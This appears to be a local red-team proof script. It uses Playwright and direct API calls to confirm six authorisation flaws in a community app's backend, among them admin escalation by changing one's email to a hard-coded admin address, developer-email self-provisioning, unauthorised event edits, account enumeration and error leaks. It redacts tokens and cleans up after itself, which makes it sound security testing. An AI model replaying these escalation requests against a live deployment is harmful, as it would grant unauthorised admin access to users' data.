import { chromium } from '@playwright/test'
import { execFileSync } from 'node:child_process'
import { writeFile } from 'node:fs/promises'
import { resolve } from 'node:path'

const repoRoot = resolve(new URL('../..', import.meta.url).pathname)
const outDir = resolve(new URL('.', import.meta.url).pathname)
const API = 'http://127.0.0.1:8787/api'
const WEB = 'http://localhost:8081'
const password = process.env.QA_PASSWORD || 'PreviewTest2026!'
const qaCode = 'QA-TEST'
const adminEmail = 'chinmayajanata@gmail.com'

const findings = []
const screenshots = []

function sql(command) {
  execFileSync(
    'npx',
    [
      'wrangler',
      'd1',
      'execute',
      'chinmaya-janata-db',
      '--local',
      '--config',
      'packages/backend/wrangler.toml',
      '--command',
      command,
    ],
    { cwd: repoRoot, stdio: 'pipe' },
  )
}

function sqlJson(command) {
  const raw = execFileSync(
    'npx',
    [
      'wrangler',
      'd1',
      'execute',
      'chinmaya-janata-db',
      '--local',
      '--config',
      'packages/backend/wrangler.toml',
      '--command',
      command,
      '--json',
    ],
    { cwd: repoRoot, stdio: 'pipe', encoding: 'utf8' },
  )
  return JSON.parse(raw)[0]?.results || []
}

async function api(path, options = {}) {
  let response
  let lastError
  for (let attempt = 0; attempt < 4; attempt += 1) {
    try {
      response = await fetch(`${API}${path}`, {
        ...options,
        headers: {
          ...(options.body && !(options.body instanceof FormData)
            ? { 'Content-Type': 'application/json' }
            : {}),
          Connection: 'close',
          ...(options.headers || {}),
        },
      })
      break
    } catch (error) {
      lastError = error
      await new Promise((resolveRetry) => setTimeout(resolveRetry, 300 * (attempt + 1)))
    }
  }
  if (!response) throw lastError
  const text = await response.text()
  let body = null
  try {
    body = text ? JSON.parse(text) : null
  } catch {
    body = { text }
  }
  return { status: response.status, ok: response.ok, body }
}

function auth(token) {
  return { Authorization: `Bearer ${token}` }
}

async function register(email, inviteCode = qaCode) {
  return api('/auth/register', {
    method: 'POST',
    body: JSON.stringify({ username: email, password, inviteCode }),
  })
}

async function login(email) {
  const result = await api('/auth/authenticate', {
    method: 'POST',
    body: JSON.stringify({ username: email, password }),
  })
  if (!result.body?.token) {
    throw new Error(`Login failed for ${email}: ${JSON.stringify(result)}`)
  }
  return result.body
}

async function verify(token) {
  return api('/auth/verify', { headers: auth(token) })
}

function compact(value) {
  return JSON.stringify(value, null, 2)
    .replaceAll(/eyJ[a-zA-Z0-9._-]+/g, '[JWT_REDACTED]')
    .slice(0, 4000)
}

async function screenshotHtml(browser, filename, title, sections) {
  const rows = sections
    .map(
      (section) => `
        <section>
          <h2>${escapeHtml(section.heading)}</h2>
          <pre>${escapeHtml(compact(section.data))}</pre>
        </section>`,
    )
    .join('')
  const html = `<!doctype html>
  <html>
    <head>
      <meta charset="utf-8" />
      <title>${escapeHtml(title)}</title>
      <style>
        body { font-family: Inter, system-ui, sans-serif; margin: 32px; color: #111827; background: #f8fafc; }
        h1 { font-size: 28px; margin: 0 0 12px; }
        h2 { font-size: 16px; margin: 22px 0 8px; }
        .meta { color: #4b5563; margin-bottom: 24px; }
        section { background: #fff; border: 1px solid #d1d5db; border-radius: 8px; padding: 16px; margin-bottom: 16px; }
        pre { white-space: pre-wrap; overflow-wrap: anywhere; background: #111827; color: #f9fafb; padding: 14px; border-radius: 6px; font-size: 13px; line-height: 1.45; }
      </style>
    </head>
    <body>
      <h1>${escapeHtml(title)}</h1>
      <div class="meta">Local red-team proof. Tokens redacted. Generated ${new Date().toISOString()}.</div>
      ${rows}
    </body>
  </html>`
  const page = await browser.newPage({ viewport: { width: 1440, height: 1100 } })
  await page.setContent(html, { waitUntil: 'domcontentloaded' })
  const path = `${outDir}/${filename}`
  await page.screenshot({ path, fullPage: true })
  await page.close()
  screenshots.push(path)
}

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
}

function addFinding(finding) {
  findings.push(finding)
  if (!finding.confirmed) {
    throw new Error(`Expected confirmed finding failed: ${finding.title}`)
  }
}

async function resetLocalAccount(email) {
  const safe = email.replaceAll("'", "''").toLowerCase()
  sql(`DELETE FROM users WHERE lower(username)='${safe}' OR lower(email)='${safe}';`)
}

async function main() {
  await api('/health')
  sql(
    `INSERT OR IGNORE INTO invite_codes (code, label, verification_level, is_active, max_uses)
     VALUES ('${qaCode}', 'Local red-team QA', 45, 1, NULL);`,
  )

  const browser = await chromium.launch({ headless: true })
  try {
    // Finding 1: normal user can become admin by changing email.
    const attackerEmail = 'redteam.attacker@janata.local'
    await resetLocalAccount(attackerEmail)
    await register(attackerEmail)
    const attackerAuth = await login(attackerEmail)
    const beforeAdmin = await api('/admin/users?limit=3', { headers: auth(attackerAuth.token) })
    const beforeVerify = await verify(attackerAuth.token)
    const updateToAdminEmail = await api('/auth/update-profile', {
      method: 'PUT',
      headers: auth(attackerAuth.token),
      body: JSON.stringify({
        email: adminEmail,
        firstName: 'Redteam',
        lastName: 'Escalated',
        profileComplete: true,
      }),
    })
    const afterVerify = await verify(attackerAuth.token)
    const afterAdminUsers = await api('/admin/users?limit=3', {
      headers: auth(attackerAuth.token),
    })
    const afterAdminStats = await api('/admin/stats', { headers: auth(attackerAuth.token) })

    await screenshotHtml(browser, '01-email-spoof-admin-escalation.png', 'Exploit 1: email spoof becomes admin', [
      { heading: 'Before exploit: same token is not admin', data: { beforeVerify, beforeAdmin } },
      { heading: 'Exploit request: self-update email to admin email', data: updateToAdminEmail },
      { heading: 'After exploit: same token can read admin endpoints', data: { afterVerify, afterAdminUsers, afterAdminStats } },
    ])

    addFinding({
      id: 'RT-001',
      severity: 'Critical',
      title: 'Any authenticated user can become admin by changing their own email to the hard-coded admin email',
      confirmed:
        beforeAdmin.status === 403 &&
        updateToAdminEmail.status === 200 &&
        afterVerify.body?.user?.email === adminEmail &&
        afterAdminUsers.status === 200,
      evidence: { beforeStatus: beforeAdmin.status, updateStatus: updateToAdminEmail.status, afterStatus: afterAdminUsers.status },
      screenshot: '01-email-spoof-admin-escalation.png',
    })

    const adminContext = await browser.newContext({ viewport: { width: 1440, height: 950 } })
    await adminContext.addInitScript(({ token, refreshToken }) => {
      localStorage.setItem('@auth_token', token)
      localStorage.setItem('@refresh_token', refreshToken)
    }, attackerAuth)
    const adminPage = await adminContext.newPage()
    await adminPage.goto(`${WEB}/admin`, { waitUntil: 'domcontentloaded' })
    await adminPage.waitForTimeout(3500)
    await adminPage.screenshot({ path: `${outDir}/02-admin-ui-after-email-spoof.png`, fullPage: false })
    screenshots.push(`${outDir}/02-admin-ui-after-email-spoof.png`)
    await adminContext.close()

    // Finding 2: developer email bypass grants admin-capable role without invite/email proof.
    const devEmail = 'sahanavasairamesh@gmail.com'
    await resetLocalAccount(devEmail)
    const devRegister = await api('/auth/register', {
      method: 'POST',
      body: JSON.stringify({ username: devEmail, password }),
    })
    const devAuth = await login(devEmail)
    const devVerify = await verify(devAuth.token)
    const devAdmin = await api('/admin/users?limit=1', { headers: auth(devAuth.token) })
    await screenshotHtml(browser, '03-developer-email-self-provision.png', 'Exploit 2: developer email self-provisions admin role', [
      { heading: 'Registration without invite code', data: devRegister },
      { heading: 'Authenticated user role after signup', data: devVerify },
      { heading: 'Admin endpoint access with the new account', data: devAdmin },
    ])
    addFinding({
      id: 'RT-002',
      severity: 'Critical',
      title: 'Unverified ownership of a listed developer email self-provisions admin-capable access',
      confirmed: devRegister.status === 201 && devVerify.body?.user?.verificationLevel >= 107 && devAdmin.status === 200,
      evidence: { registerStatus: devRegister.status, verificationLevel: devVerify.body?.user?.verificationLevel, adminStatus: devAdmin.status },
      screenshot: '03-developer-email-self-provision.png',
    })

    // Finding 3: normal member can edit legacy events with created_by NULL.
    const memberEmail = 'redteam.member@janata.local'
    await resetLocalAccount(memberEmail)
    await register(memberEmail)
    const memberAuth = await login(memberEmail)
    const legacy = sqlJson("SELECT id, title, created_by FROM events WHERE created_by IS NULL LIMIT 1;")[0]
    if (!legacy) throw new Error('No local legacy event with created_by NULL found')
    const redTitle = `[REDTEAM LOCAL PROOF] ${legacy.title}`
    const eventUpdate = await api('/updateEvent', {
      method: 'POST',
      headers: auth(memberAuth.token),
      body: JSON.stringify({ eventJSON: { id: legacy.id, title: redTitle } }),
    })
    const eventAfter = await api('/fetchEvent', {
      method: 'POST',
      body: JSON.stringify({ id: legacy.id }),
    })
    const eventRestore = await api('/updateEvent', {
      method: 'POST',
      headers: auth(memberAuth.token),
      body: JSON.stringify({ eventJSON: { id: legacy.id, title: legacy.title } }),
    })
    await screenshotHtml(browser, '04-legacy-event-takeover.png', 'Exploit 3: normal member edits legacy event', [
      { heading: 'Legacy event selected', data: legacy },
      { heading: 'Normal member update response', data: eventUpdate },
      { heading: 'Fetched event after unauthorized edit', data: eventAfter },
      { heading: 'Cleanup restore response', data: eventRestore },
    ])
    addFinding({
      id: 'RT-003',
      severity: 'High',
      title: 'Any authenticated user can edit legacy events whose created_by is NULL',
      confirmed: eventUpdate.status === 200 && eventAfter.body?.event?.title === redTitle && eventRestore.status === 200,
      evidence: { updateStatus: eventUpdate.status, eventId: legacy.id },
      screenshot: '04-legacy-event-takeover.png',
    })

    // Finding 4: any authenticated user can create centers.
    const centerCreate = await api('/addCenter', {
      method: 'POST',
      headers: auth(memberAuth.token),
      body: JSON.stringify({
        centerName: `Redteam Local Center ${Date.now()}`,
        latitude: 37.3349,
        longitude: -121.8881,
        address: 'Local proof only',
      }),
    })
    const createdCenterId = centerCreate.body?.id
    const centerFetch = createdCenterId
      ? await api('/fetchCenter', {
          method: 'POST',
          body: JSON.stringify({ centerID: createdCenterId }),
        })
      : null
    if (createdCenterId) {
      sql(`DELETE FROM centers WHERE id='${createdCenterId.replaceAll("'", "''")}';`)
    }
    await screenshotHtml(browser, '05-member-center-creation.png', 'Exploit 4: member creates center', [
      { heading: 'Create center as non-admin member', data: centerCreate },
      { heading: 'Public fetch confirms inserted center', data: centerFetch },
      { heading: 'Cleanup', data: { deletedLocalCenterId: createdCenterId || null } },
    ])
    addFinding({
      id: 'RT-004',
      severity: 'Medium',
      title: 'Any authenticated user can create center records',
      confirmed: centerCreate.status === 200 && !!createdCenterId && centerFetch?.status === 200,
      evidence: { createStatus: centerCreate.status, centerId: createdCenterId },
      screenshot: '05-member-center-creation.png',
    })

    // Finding 5: unauthenticated account enumeration.
    const enumKnown = await api('/userExistence', {
      method: 'POST',
      body: JSON.stringify({ username: memberEmail }),
    })
    const enumUnknown = await api('/userExistence', {
      method: 'POST',
      body: JSON.stringify({ username: `missing-${Date.now()}@janata.local` }),
    })
    await screenshotHtml(browser, '06-unauthenticated-user-enumeration.png', 'Exploit 5: unauthenticated user enumeration', [
      { heading: 'Known local account lookup', data: enumKnown },
      { heading: 'Unknown account lookup', data: enumUnknown },
    ])
    addFinding({
      id: 'RT-005',
      severity: 'Low',
      title: 'Unauthenticated endpoint reveals whether an email account exists',
      confirmed: enumKnown.body?.existence === true && enumUnknown.body?.existence === false,
      evidence: { known: enumKnown.body, unknown: enumUnknown.body },
      screenshot: '06-unauthenticated-user-enumeration.png',
    })

    // Finding 6: internal parser errors are returned to clients.
    const parserLeak = await api('/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{"username":',
    })
    await screenshotHtml(browser, '07-error-detail-leak.png', 'Exploit 6: backend returns internal error detail', [
      { heading: 'Malformed JSON response', data: parserLeak },
    ])
    addFinding({
      id: 'RT-006',
      severity: 'Low',
      title: 'Global error handler returns internal exception messages to clients',
      confirmed: parserLeak.status === 500 && typeof parserLeak.body?.error === 'string' && parserLeak.body.error.length > 0,
      evidence: { status: parserLeak.status, error: parserLeak.body?.error },
      screenshot: '07-error-detail-leak.png',
    })

    await writeFile(`${outDir}/findings.json`, JSON.stringify({ findings, screenshots }, null, 2))
  } finally {
    await browser.close()
  }
}

main().catch((error) => {
  console.error(error)
  process.exit(1)
})
